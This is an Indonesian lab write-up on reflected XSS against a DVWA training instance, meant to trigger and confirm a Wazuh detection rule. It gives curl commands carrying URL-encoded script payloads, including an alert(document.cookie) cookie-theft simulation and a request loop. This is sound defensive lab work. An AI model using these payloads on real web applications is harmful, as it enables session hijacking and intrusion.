# XSS (Cross-Site Scripting) Attack

## Deskripsi
XSS menyisipkan script berbahaya ke halaman web yang kemudian
dieksekusi di browser korban. Serangan ini dapat digunakan untuk
mencuri session cookie, melakukan phishing, atau menjalankan
script berbahaya di browser korban.

## MITRE ATT&CK
- Tactic: Execution
- Technique: T1059.007 — JavaScript

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/xss_r/`
- Parameter: `name`

## Persiapan
Ambil session cookie DVWA dari browser sebelum menjalankan serangan:
1. Buka DVWA di browser
2. Tekan `F12` → tab **Application** → **Cookies**
3. Copy nilai `PHPSESSID`

```bash
SESS="PHPSESSID=ISI_SESSION_DISINI; security=low"
```
![Step 1 - Setup Session](screenshoot/Screenshot_2026-04-12_173210.png)

## Attack Commands

### 1. Basic Alert — Konfirmasi XSS Bekerja
Payload paling dasar untuk membuktikan XSS dapat dieksekusi.
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

### 2. Cookie Stealing Simulation
Mensimulasikan pencurian session cookie korban menggunakan `document.cookie`.
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

### 3. Verifikasi Script Tereksekusi di Response
Melihat langsung apakah payload `<script>` ikut ter-render di dalam HTML response.
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  -b "$SESS" | grep -i "script"
```

### 4. Multiple Request — Trigger Wazuh Detection
Mengirim banyak request sekaligus agar event muncul di Wazuh dashboard.
```bash
for i in {1..5}; do
  curl -s "http://192.168.217.130/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert($i)%3C%2Fscript%3E" \
    -b "$SESS" -o /dev/null -w "Request $i - Status: %{http_code}\n"
done
```
![Step 1 - Setup Session](Screenshot_2026-04-12_80323.png)

## Detection di Wazuh

### Wazuh Threat Hunting — Rule 100012 Triggered
![Wazuh XSS Detection](Screenshot_2026-04-12_180414.png)
> Rule **100012** berhasil mendeteksi serangan XSS dengan level **10 (High)**.
> Deskripsi: *DVWA: XSS Attack terdeteksi*

## Detection
- Rule ID: `100012`
- Level: `10` (High)
- Rule Chain: `31106` → `100010` → `100012`

## Referensi
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [MITRE T1059.007](https://attack.mitre.org/techniques/T1059/007/)
